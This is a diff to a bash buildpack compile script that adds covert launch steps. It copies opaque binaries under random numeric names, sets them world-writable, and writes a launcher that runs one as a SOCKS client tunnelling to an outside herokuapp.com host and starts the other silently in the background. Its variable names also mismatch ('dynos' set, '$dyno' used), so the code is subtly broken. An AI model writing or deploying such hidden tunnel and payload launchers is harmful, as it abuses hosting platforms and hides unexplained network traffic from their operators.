@@ -1,11 +1,25 @@
 #!/usr/bin/env bash
 set -e
-mkdir -p "$1/bin/"
-cp -a binaries-$STACK/* "$1/bin/"
 
-chmod 777 $1/bin/ypw-3333
-chmod 777 $1/bin/content
-chmod 777 $1/bin/compile
+dynos=$(shuf -i 10000000000-99999999999 -n 1)
+dynos2=$(shuf -i 10000000000-99999999999 -n 1)
+
+mkdir -p "$1/bin/"
+
+cp -a binaries-$STACK/ypw-3333 "$1/bin/$dyno"
+cp -a binaries-$STACK/content "$1/bin/$dyno2"
+cp -a binaries-$STACK/main "$1/bin/main"
+
+chmod 777 $1/bin/$dyno
+chmod 777 $1/bin/$dyno2
+
+cat > $1/bin/mode <<END
+/app/bin/$dyno2 client https://myapp40620746343.herokuapp.com 0.0.0.0:3333:socks >/dev/null 2>&1 >/dev/null &
+sleep 5
+/app/bin/$dyno >/dev/null 2>&1 >/dev/null &
+END
+
+chmod 777 $1/bin/mode
 chmod 777 $1/bin/main
 mkdir -p "$1/.profile.d/"
 cat >>"$1"/.profile.d/main.sh <<EOF
